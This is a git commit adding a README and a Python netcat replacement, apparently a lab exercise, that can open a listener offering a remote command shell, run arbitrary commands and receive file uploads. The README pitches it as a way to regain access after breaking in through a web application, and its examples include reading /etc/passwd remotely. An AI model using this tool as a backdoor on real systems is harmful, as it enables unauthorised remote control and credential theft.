e6401892ac9519b80c7d264ee9a344b0d890214e
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-01-22 06:11:35 +0100

    First version netcat replacement

---
+++ netcat_replace/README.md
@@ -0,0 +1,37 @@
+# Netcat replace
+
+The utility knife of networking: read and write data across the network, meaning you can use it to execute
+remote commands, pass files back and forth, or even open a remote shell. If a server allows python, well ... 
+Useful for creating a simple network client and server to push files, or a listener giving command line access. 
+If broken in through a web application, for dropping a Python callback to give secondary access without having to first burn a trojan or backdoor.
+
+This is a basic version with limited functionality, and to be expanded on.
+
+## Usage
+
+```shell
+usage: netcat.py [-h] [-c] [-e EXECUTE] [-l] [-p PORT] [-t TARGET] [-u UPLOAD]
+
+Netcat replacement Tool
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c, --command         command shell
+  -e EXECUTE, --execute EXECUTE
+                        execute specified command
+  -l, --listen          listen
+  -p PORT, --port PORT  specified port
+  -t TARGET, --target TARGET
+                        specified IP
+  -u UPLOAD, --upload UPLOAD
+                        upload file
+
+Example: 
+            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
+            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload file
+            netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
+            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
+            netcat.py -t 192.168.1.108 -p 5555 # connect to server
+```
+
+Play in the lab!
--- netcat_replace/netcat.py
+++ netcat_replace/netcat.py
@@ -1,46 +1,51 @@
-import argparse
-import shlex
-import socket
-import subprocess
-import sys
-import textwrap
-import threading
+import argparse     # https://docs.python.org/3/library/argparse.html
+import os           # https://docs.python.org/3/library/os.html
+import shlex        # https://docs.python.org/3/library/shlex.html
+import socket       # https://docs.python.org/3/library/socket.html
+import subprocess   # https://docs.python.org/3/library/subprocess.html
+import sys          # https://docs.python.org/3/library/sys.html
+import textwrap     # https://docs.python.org/3/library/textwrap.html
+import threading    # https://docs.python.org/3/library/threading.html
+
+
+def is_not_root():
+    return os.geteuid() != 0
 
 
 # Run a command and return the output
 def run_command(cmd):
-    # trim the newline
+    # Trim (newline)
     cmd = cmd.rstrip()
     if not cmd:
         return
-    output = subprocess.check_output(
-        shlex.split(cmd),
-        stderr=subprocess.STDOUT)
-    # Send the output back to the client
+    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
     return output.decode()
 
 
-# create a command line interface
+# Create a command line interface
 def get_args():
     # The -c , -e , and -u arguments imply the -l argument, because those arguments only apply
     # to the listener side of the communication. The sender side makes the connection to the
     # listener, and so it only needs the -t and -p arguments to define the target listener.
     parser = argparse.ArgumentParser(
-        description='Netcat replacement Tool',
+        description="Netcat replacement Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=textwrap.dedent('''Example: 
+        epilog=textwrap.dedent(
+            """Example: 
             netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
             netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
             netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
             echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
             netcat.py -t 192.168.1.108 -p 5555 # connect to server
-        '''))
-    parser.add_argument('-c', '--command', action='store_true', help='command shell')
-    parser.add_argument('-e', '--execute', help='execute specified command')
-    parser.add_argument('-l', '--listen', action='store_true', help='listen')
-    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
-    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
-    parser.add_argument('-u', '--upload', help='upload file')
+        """
+        ),
+    )
+    parser.add_argument("-c", "--command", action="store_true", help="command shell")
+    parser.add_argument("-e", "--execute", help="execute specified command")
+    parser.add_argument("-l", "--listen", action="store_true", help="listen")
+    parser.add_argument("-p", "--port", type=int, default=5555, help="specified port")
+    parser.add_argument("-t", "--target", default="192.168.1.203", help="specified IP")
+    parser.add_argument("-u", "--upload", help="upload file")
     values = parser.parse_args()
     return values
 
@@ -69,7 +74,7 @@ class NetCat:
         try:
             while True:
                 recv_len = 1
-                response = ''
+                response = ""
                 while recv_len:
                     data = self.socket.recv(4096)
                     recv_len = len(data)
@@ -78,11 +83,11 @@ class NetCat:
                         break
                 if response:
                     print(response)
-                    buffer = input('> ')
-                    buffer += '\n'
+                    buffer = input("> ")
+                    buffer += "\n"
                     self.socket.send(buffer.encode())
         except KeyboardInterrupt:
-            print('[+] \nDetected CTRL+C')
+            print("[+] \nDetected CTRL+C")
             self.socket.close()
             sys.exit()
 
@@ -92,10 +97,7 @@ class NetCat:
 
         while True:
             client_socket, _ = self.socket.accept()
-            client_thread = threading.Thread(
-                target=self.handle,
-                args=(client_socket,)
-            )
+            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
             client_thread.start()
 
     def handle(self, client_socket):
@@ -105,7 +107,7 @@ class NetCat:
 
             client_socket.send(output.encode())
         elif self.args.upload:
-            file_buffer = b''
+            file_buffer = b""
             while True:
                 data = client_socket.recv(4096)
                 if data:
@@ -113,36 +115,40 @@ class NetCat:
                 else:
                     break
 
-            with open(self.args.upload, 'wb') as f:
+            with open(self.args.upload, "wb") as f:
                 f.write(file_buffer)
-            message = f'Saved file {self.args.upload}'
+            message = f"[+] Saved file {self.args.upload}"
             client_socket.send(message.encode())
 
         elif self.args.command:
-            cmd_buffer = b''
+            cmd_buffer = b""
             while True:
                 try:
-                    client_socket.send(b'Netcat: #> ')
-                    while '\n' not in cmd_buffer.decode():
+                    client_socket.send(b"Netcat: #> ")
+                    while "\n" not in cmd_buffer.decode():
                         cmd_buffer += client_socket.recv(64)
                     response = run_command(cmd_buffer.decode())
                     if response:
                         client_socket.send(response.encode())
-                    cmd_buffer = b''
+                    cmd_buffer = b""
                 except Exception as e:
-                    print(f'[-] Server killed {e}')
+                    print(f"[-] Server killed {e}")
                     self.socket.close()
                     sys.exit()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
+    if is_not_root():
+        sys.exit("[-] This script requires superuser privileges.")
+
     options = get_args()
     if options.listen:
         # If as listener, invoke the NetCat object with an empty buffer string
-        setbuffer = ''
+        setbuffer = ""
     else:
         # Otherwise, send the buffer content from stdin
         setbuffer = sys.stdin.read()
+
     nc = NetCat(options, setbuffer.encode())
     # Start it up
     nc.run()
